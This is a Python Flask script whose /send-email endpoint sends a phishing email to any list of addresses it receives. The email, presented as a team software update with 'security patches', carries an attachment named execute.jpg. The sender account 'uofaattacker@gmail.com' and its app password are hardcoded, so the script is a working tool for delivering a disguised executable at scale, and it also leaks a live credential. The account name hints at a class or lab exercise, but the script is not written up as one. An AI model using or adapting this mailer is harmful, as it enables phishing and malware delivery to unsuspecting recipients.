from flask import Flask, request, jsonify
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os

app = Flask(__name__)

# Email-sending function
def send_email(sender_email, sender_password, recipient_emails, zip_path):
    subject = "🚀 Latest Update Attached – Please Review"
    body = """
    Dear Team,

    I hope you're doing well.

    Please find attached the latest executable file for the project. This update includes new features, performance improvements, and critical bug fixes. Kindly review the file and provide your feedback at your earliest convenience.

    Attachment Name: project_executable_v1.0.zip
    Description:
    - New user interface enhancements.
    - Performance optimizations.
    - Security patches for identified vulnerabilities.

    If you have any questions or encounter issues while using the file, feel free to reach out.

    Thank you for your time and support!

    Best regards,
    Vivek Aswal
    """

    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = ', '.join(recipient_emails)  # Combine all recipients in a single 'To' header
    msg['Subject'] = subject

    # Add the body
    body_part = MIMEText(body, 'plain')
    msg.attach(body_part)

    # Attach the zip file
    try:
        with open(zip_path, 'rb') as attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f"attachment; filename={os.path.basename(zip_path)}")
            msg.attach(part)
    except FileNotFoundError:
        return {"error": f"The file {zip_path} was not found."}

    # Send the email
    try:
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, recipient_emails, msg.as_string())  # Send email to all recipients
        server.quit()
        return {"status": "Emails sent successfully"}
    except smtplib.SMTPException as e:
        return {"error": f"Error sending email: {str(e)}"}

# API Endpoint
@app.route('/send-email', methods=['POST'])
def api_send_email():
    data = request.json
    if not data or 'emails' not in data:
        return jsonify({"error": "Request must contain an 'emails' field"}), 400

    recipient_emails = data['emails']
    if not isinstance(recipient_emails, list) or not all(isinstance(email, str) for email in recipient_emails):
        return jsonify({"error": "'emails' must be a list of email addresses"}), 400

    # Email credentials
    sender_email = 'uofaattacker@gmail.com'
    sender_password = ' bjqp sloj wuey myuj'  # App password for Gmail

    # Attachment file
    zip_path = 'execute.jpg'  # Ensure this file exists in your directory
    if not os.path.exists(zip_path):
        return jsonify({"error": f"Attachment file '{zip_path}' not found"}), 500

    # Send the email
    result = send_email(sender_email, sender_password, recipient_emails, zip_path)
    return jsonify(result)

# Main entry point
if __name__ == "__main__":
    app.run(debug=True, host='0.0.0.0', port=5000)
